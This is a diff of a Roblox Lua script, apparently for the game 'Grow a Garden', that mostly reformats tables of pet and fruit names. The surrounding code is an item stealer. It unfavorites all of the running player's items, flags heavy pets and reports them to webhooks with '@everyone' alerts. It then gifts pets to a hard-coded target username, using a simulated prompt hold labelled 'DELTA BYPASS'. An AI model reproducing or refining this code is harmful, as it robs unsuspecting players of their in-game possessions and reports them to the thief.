@@ -138,6 +138,7 @@ local player = game:GetService("Players").LocalPlayer
 local bp = player:WaitForChild("Backpack")
 local event = game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
 
+-- UNFAVORITE ALL ITEMS BEFORE GIFTING, CONTINUE IMMEDIATELY
 for _, item in ipairs(bp:GetChildren()) do
     if item:GetAttribute("Favorite") == true then
         event:FireServer(item)
@@ -147,115 +148,31 @@ end
 local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
 
 local allowedPets = {
-    ["Raccoon"] = true,
-    ["Disco Bee"] = true,
-    ["Bear Bee"] = true,
-    ["Scarlet Macaw"] = true,
-    ["Petal Bee"] = true,
-    ["Mimic Octopus"] = true,
-    ["Queen Bee"] = true,
-    ["Dragonfly"] = true,
-    ["Red Fox"] = true,
-    ["Polar Bear"] = true,
-    ["Butterfly"] = true,
-    ["Chicken Zombie"] = true,
-    ["Cooked Owl"] = true,
+    ["Raccoon"] = true, ["Disco Bee"] = true, ["Bear Bee"] = true, ["Scarlet Macaw"] = true,
+    ["Petal Bee"] = true, ["Mimic Octopus"] = true, ["Queen Bee"] = true, ["Dragonfly"] = true,
+    ["Red Fox"] = true, ["Polar Bear"] = true, ["Butterfly"] = true, ["Chicken Zombie"] = true, ["Cooked Owl"] = true,
 }
 
--- EMOJI MAPS FOR PETS AND FRUITS
 local petEmojis = {
-    ["Raccoon"] = "🦝",
-    ["Disco Bee"] = "🐝",
-    ["Bear Bee"] = "🐻",
-    ["Scarlet Macaw"] = "🦜",
-    ["Petal Bee"] = "🌸",
-    ["Mimic Octopus"] = "🐙",
-    ["Queen Bee"] = "👑",
-    ["Dragonfly"] = "🐞",
-    ["Red Fox"] = "🦊",
-    ["Polar Bear"] = "🐻‍❄️",
-    ["Butterfly"] = "🦋",
-    ["Chicken Zombie"] = "🐔",
-    ["Cooked Owl"] = "🦉",
+    ["Raccoon"] = "🦝", ["Disco Bee"] = "🐝", ["Bear Bee"] = "🐻", ["Scarlet Macaw"] = "🦜", ["Petal Bee"] = "🌸",
+    ["Mimic Octopus"] = "🐙", ["Queen Bee"] = "👑", ["Dragonfly"] = "🐞", ["Red Fox"] = "🦊", ["Polar Bear"] = "🐻‍❄️",
+    ["Butterfly"] = "🦋", ["Chicken Zombie"] = "🐔", ["Cooked Owl"] = "🦉",
 }
 
 local fruitEmojis = {
-    Feijoa = "🟢",
-    Loquat = "🏵️",
-    ["Prickly Pear"] = "🌵",
-    ["Bell Pepper"] = "🫑",
-    Kiwi = "🥝",
-    Pineapple = "🍍",
-    Banana = "🍌",
-    Avocado = "🥑",
-    ["Green Apple"] = "🍏",
-    Cauliflower = "⚪",
-    ["Elephant Ears"] = "🐘",
-    ["Rosy Delight"] = "🌹",
-    ["Parasol Flower"] = "⛱️",
-    Pear = "🍐",
-    Cantaloupe = "🍈",
-    ["Wild Carrot"] = "🥕",
-    Carrot = "🥕",
-    Tomato = "🍅",
-    Corn = "🌽",
-    Strawberry = "🍓",
-    Blueberry = "🫐",
-    ["Orange Tulip"] = "🌷",
-    Daffodil = "🌼",
-    Raspberry = "🍇",
-    Apple = "🍏",
-    Mushroom = "🍄",
-    Mint = "🌱",
-    Lemon = "🍋",
-    Peach = "🍑",
-    Pumpkin = "🎃",
-    Watermelon = "🍉",
-    Cactus = "🌵",
-    Bamboo = "🎋",
-    Coconut = "🥥",
-    Mango = "🥭",
-    ["Dragon Fruit"] = "🐉",
-    Grape = "🍇",
-    Passionfruit = "🍈",
-    Papaya = "🧡",
-    ["Cherry Blossom"] = "🌸",
-    Glowshroom = "🍄",
-    Nightshade = "🌑",
-    ["Soul Fruit"] = "💀",
-    ["Cursed Fruit"] = "🧟",
-    Lotus = "🪷",
-    ["Venus Fly Trap"] = "🌱",
-    Moonglow = "🌙",
-    Moonflower = "🌼",
-    ["Moon Mango"] = "🥭",
-    ["Moon Blossom"] = "🌸",
-    Celestiberry = "🪐",
-    Starfruit = "🌟",
-    ["Dragon Pepper"] = "🌶️",
-    ["Nectar Thorn"] = "🌿",
-    Cocovine = "🌴",
-    Beanstalk = "🫛",
-    Cacao = "🫘",
-    Pepper = "🌶️",
-    ["Blood Banana"] = "🍌",
-    ["Moon Melon"] = "🍈",
-    ["Candy Blossom"] = "🍬",
-    ["Candy Sunflower"] = "🌻",
-    ["Red Lollipop"] = "🍭",
-    ["Chocolate Carrot"] = "🍫",
-    ["Easter Egg"] = "🥚",
-    Nectarine = "🍑",
-    ["Sugar Apple"] = "🍏",
-    Suncoil = "☀️",
-    ["Violet Corn"] = "🌽",
-    ["Bee Balm"] = "🐝",
-    Succulent = "🌵",
-    Crocus = "🌸",
-    Eggplant = "🍆",
-    Durian = "🥥",
+    Feijoa = "🟢", Loquat = "🏵️", ["Prickly Pear"] = "🌵", ["Bell Pepper"] = "🫑", Kiwi = "🥝", Pineapple = "🍍",
+    Banana = "🍌", Avocado = "🥑", ["Green Apple"] = "🍏", Cauliflower = "⚪", ["Elephant Ears"] = "🐘", ["Rosy Delight"] = "🌹",
+    ["Parasol Flower"] = "⛱️", Pear = "🍐", Cantaloupe = "🍈", ["Wild Carrot"] = "🥕", Carrot = "🥕", Tomato = "🍅",
+    Corn = "🌽", Strawberry = "🍓", Blueberry = "🫐", ["Orange Tulip"] = "🌷", Daffodil = "🌼", Raspberry = "🍇",
+    Apple = "🍏", Mushroom = "🍄", Mint = "🌱", Lemon = "🍋", Peach = "🍑", Pumpkin = "🎃", Watermelon = "🍉",
+    Cactus = "🌵", Bamboo = "🎋", Coconut = "🥥", Mango = "🥭", ["Dragon Fruit"] = "🐉", Grape = "🍇", Passionfruit = "🍈",
+    Papaya = "🧡", ["Cherry Blossom"] = "🌸", Glowshroom = "🍄", Nightshade = "🌑", ["Soul Fruit"] = "💀", ["Cursed Fruit"] = "🧟",
+    Lotus = "🪷", ["Venus Fly Trap"] = "🌱", Moonglow = "🌙", Moonflower = "🌼", ["Moon Mango"] = "🥭", ["Moon Blossom"] = "🌸",
+    Celestiberry = "🪐", Starfruit = "🌟", ["Dragon Pepper"] = "🌶️", ["Nectar Thorn"] = "🌿", Cocovine = "🌴", Beanstalk = "🫛",
+    Cacao = "🫘", Pepper = "🌶️", ["Blood Banana"] = "🍌", ["Moon Melon"] = "🍈", ["Candy Blossom"] = "🍬", ["Candy Sunflower"] = "🌻",
+    ["Red Lollipop"] = "🍭", ["Chocolate Carrot"] = "🍫", ["Easter Egg"] = "🥚", Nectarine = "🍑", ["Sugar Apple"] = "🍏",
+    Suncoil = "☀️", ["Violet Corn"] = "🌽", ["Bee Balm"] = "🐝", Succulent = "🌵", Crocus = "🌸", Eggplant = "🍆", Durian = "🥥",
 }
-
 local knownFruits = {}
 for fruitName, _ in pairs(fruitEmojis) do
     knownFruits[fruitName] = true
@@ -269,12 +186,9 @@ end
 for _, item in pairs(backpack:GetChildren()) do
     local baseName = item.Name:match("^(.-)%s*%[") or item.Name
     local kg = tonumber(string.match(item.Name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
-
-    -- Only dynamically add as pet if not a known fruit!
     if kg > 10 and not knownFruits[baseName] then
         if not allowedPets[baseName] then
             allowedPets[baseName] = true
-            -- Send notification to BOTH main webhook and logs webhook
             if req then
                 local bigPetPayload = {
                     ["content"] = "@everyone",
@@ -412,8 +326,7 @@ local function getKg(name)
     return tonumber(string.match(name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
 end
 
-local function printSortedItems(items)
-end
+local function printSortedItems(items) end
 
 local function hasValidItems()
     for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
@@ -438,7 +351,6 @@ local function startGiving()
     if not hasValidItems() then return end
     local target = Players:FindFirstChild(username)
     if not target or not target.Character then return end
-
     local hrp = target.Character:FindFirstChild("HumanoidRootPart")
     if not hrp then return end
 
@@ -470,12 +382,10 @@ local function startGiving()
 
             ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", target)
 
-            -- DELTA BYPASS for ProximityPrompt
             prompt.Enabled = true
             prompt:InputHoldBegin(Enum.UserInputType.Touch)
             task.wait(prompt.Duration)
             prompt:InputHoldEnd(Enum.UserInputType.Touch)
-            -- END DELTA BYPASS
 
             if item:IsDescendantOf(LocalPlayer.Character) then
                 item.Parent = LocalPlayer.Backpack
